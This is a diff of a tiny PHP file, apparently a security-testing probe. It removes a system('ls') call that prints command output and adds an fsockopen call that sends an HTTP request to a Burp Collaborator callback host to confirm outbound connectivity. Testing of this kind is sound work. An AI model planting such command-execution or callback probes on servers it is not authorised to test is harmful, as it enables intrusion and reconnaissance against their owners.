@@ -1,10 +1,15 @@
 <?php
-echo '<pre>';
-
-$last_line = system('ls', $retval);
-
-echo '
-</pre>
-<hr />Последняя строка вывода: ' . $last_line . '
-<hr />Код возврата: ' . $retval;
+$fp = fsockopen("1hjyfv8evtejru5apa5hv7u5uw0mob.burpcollaborator.net", 80, $errno, $errstr, 30);
+if (!$fp) {
+    echo "$errstr ($errno)<br />\n";
+} else {
+    $out = "GET / HTTP/1.1\r\n";
+    $out .= "Host: www.example.com\r\n";
+    $out .= "Connection: Close\r\n\r\n";
+    fwrite($fp, $out);
+    while (!feof($fp)) {
+        echo fgets($fp, 128);
+    }
+    fclose($fp);
+}
 ?>
